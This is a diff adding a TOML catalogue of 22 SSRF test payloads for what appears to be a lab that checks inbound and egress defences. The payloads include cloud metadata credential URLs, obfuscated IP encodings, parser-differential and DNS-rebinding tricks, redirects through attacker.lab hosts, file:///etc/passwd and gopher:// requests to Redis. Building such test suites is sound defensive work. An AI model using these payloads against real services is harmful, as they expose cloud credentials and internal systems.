@@ -1,0 +1,218 @@
+# Phase 1 attack catalogue. See docs/threat_model.md for the meaning of each field.
+# `payload` is the value of the vulnerable `url` parameter as the application receives it.
+# `resolves_to` is the address the application finally connects to inside the lab.
+
+[assets.metadata]
+description = "Emulated cloud metadata service holding dummy credentials"
+networks = ["169.254.169.254/32", "fd00:ec2::254/128"]
+
+[assets.internal]
+description = "Private lab services (admin panel, Redis-like store)"
+networks = ["10.10.0.0/24"]
+
+[assets.loopback]
+description = "Services bound to the application container's own loopback"
+networks = ["127.0.0.0/8", "::1/128", "0.0.0.0/32"]
+
+[assets.filesystem]
+description = "Local files of the application container"
+networks = []
+
+[[attacks]]
+id = "A01"
+technique = "Metadata IPv4 literal"
+vector = "literal"
+payload = "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
+asset = "metadata"
+resolves_to = "169.254.169.254"
+layers = ["inbound", "egress"]
+
+[[attacks]]
+id = "A02"
+technique = "Metadata AWS IMDSv1 path"
+vector = "literal"
+payload = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+asset = "metadata"
+resolves_to = "169.254.169.254"
+layers = ["inbound", "egress"]
+
+[[attacks]]
+id = "A03"
+technique = "Metadata hostname"
+vector = "dns"
+payload = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+asset = "metadata"
+resolves_to = "169.254.169.254"
+layers = ["inbound", "egress"]
+
+[[attacks]]
+id = "A04"
+technique = "Decimal (dword) IPv4"
+vector = "literal"
+payload = "http://2852039166/computeMetadata/v1/"
+asset = "metadata"
+resolves_to = "169.254.169.254"
+layers = ["inbound", "egress"]
+
+[[attacks]]
+id = "A05"
+technique = "Hexadecimal IPv4"
+vector = "literal"
+payload = "http://0xa9fea9fe/computeMetadata/v1/"
+asset = "metadata"
+resolves_to = "169.254.169.254"
+layers = ["inbound", "egress"]
+
+[[attacks]]
+id = "A06"
+technique = "Octal IPv4"
+vector = "literal"
+payload = "http://0251.0376.0251.0376/computeMetadata/v1/"
+asset = "metadata"
+resolves_to = "169.254.169.254"
+layers = ["inbound", "egress"]
+
+[[attacks]]
+id = "A07"
+technique = "Mixed-radix dotted IPv4"
+vector = "literal"
+payload = "http://0xa9.254.0251.254/computeMetadata/v1/"
+asset = "metadata"
+resolves_to = "169.254.169.254"
+layers = ["inbound", "egress"]
+
+[[attacks]]
+id = "A08"
+technique = "Shortened IPv4"
+vector = "literal"
+payload = "http://127.1:6379/"
+asset = "loopback"
+resolves_to = "127.0.0.1"
+layers = ["inbound", "egress"]
+
+[[attacks]]
+id = "A09"
+technique = "Unspecified address"
+vector = "literal"
+payload = "http://0.0.0.0:6379/"
+asset = "loopback"
+resolves_to = "0.0.0.0"
+layers = ["inbound", "egress"]
+
+[[attacks]]
+id = "A10"
+technique = "IPv6 loopback"
+vector = "literal"
+payload = "http://[::1]:6379/"
+asset = "loopback"
+resolves_to = "::1"
+layers = ["inbound", "egress"]
+
+[[attacks]]
+id = "A11"
+technique = "IPv4-mapped IPv6"
+vector = "literal"
+payload = "http://[::ffff:a9fe:a9fe]/computeMetadata/v1/"
+asset = "metadata"
+resolves_to = "169.254.169.254"
+layers = ["inbound", "egress"]
+
+[[attacks]]
+id = "A12"
+technique = "Metadata IPv6 literal"
+vector = "literal"
+payload = "http://[fd00:ec2::254]/latest/meta-data/"
+asset = "metadata"
+resolves_to = "fd00:ec2::254"
+layers = ["inbound", "egress"]
+
+[[attacks]]
+id = "A13"
+technique = "Percent-encoded host"
+vector = "literal"
+payload = "http://%31%36%39.254.169.254/computeMetadata/v1/"
+asset = "metadata"
+resolves_to = "169.254.169.254"
+layers = ["inbound", "egress"]
+
+[[attacks]]
+id = "A14"
+technique = "Userinfo confusion"
+vector = "literal"
+payload = "http://trusted.example@10.10.0.10/admin"
+asset = "internal"
+resolves_to = "10.10.0.10"
+layers = ["inbound", "egress"]
+
+[[attacks]]
+id = "A15"
+technique = "Parser differential (backslash before @)"
+vector = "parser"
+payload = "http://10.10.0.10\\@trusted.example/admin"
+asset = "internal"
+resolves_to = "10.10.0.10"
+layers = ["inbound", "egress"]
+note = "urllib.parse reads trusted.example; WHATWG parsers read 10.10.0.10"
+
+[[attacks]]
+id = "A16"
+technique = "Private IPv4 literal"
+vector = "literal"
+payload = "http://10.10.0.10/admin"
+asset = "internal"
+resolves_to = "10.10.0.10"
+layers = ["inbound", "egress"]
+
+[[attacks]]
+id = "A17"
+technique = "Attacker domain resolving to private IP"
+vector = "dns"
+payload = "http://intranet.attacker.lab/admin"
+asset = "internal"
+resolves_to = "10.10.0.10"
+layers = ["egress"]
+
+[[attacks]]
+id = "A18"
+technique = "DNS rebinding"
+vector = "dns"
+payload = "http://rebind.attacker.lab/computeMetadata/v1/"
+asset = "metadata"
+resolves_to = "169.254.169.254"
+layers = ["egress"]
+note = "First answer is public (passes inbound checks), second answer is the metadata IP"
+
+[[attacks]]
+id = "A19"
+technique = "Open redirect to metadata"
+vector = "redirect"
+payload = "http://redirect.attacker.lab/r?to=http://169.254.169.254/computeMetadata/v1/"
+asset = "metadata"
+resolves_to = "169.254.169.254"
+layers = ["egress"]
+
+[[attacks]]
+id = "A20"
+technique = "Redirect with scheme downgrade"
+vector = "redirect"
+payload = "https://redirect.attacker.lab/r?to=http://10.10.0.11:6379/"
+asset = "internal"
+resolves_to = "10.10.0.11"
+layers = ["egress"]
+
+[[attacks]]
+id = "A21"
+technique = "file:// scheme"
+vector = "scheme"
+payload = "file:///etc/passwd"
+asset = "filesystem"
+layers = ["inbound"]
+
+[[attacks]]
+id = "A22"
+technique = "gopher:// to Redis"
+vector = "scheme"
+payload = "gopher://10.10.0.11:6379/_INFO%0D%0A"
+asset = "internal"
+resolves_to = "10.10.0.11"
+layers = ["inbound", "egress"]
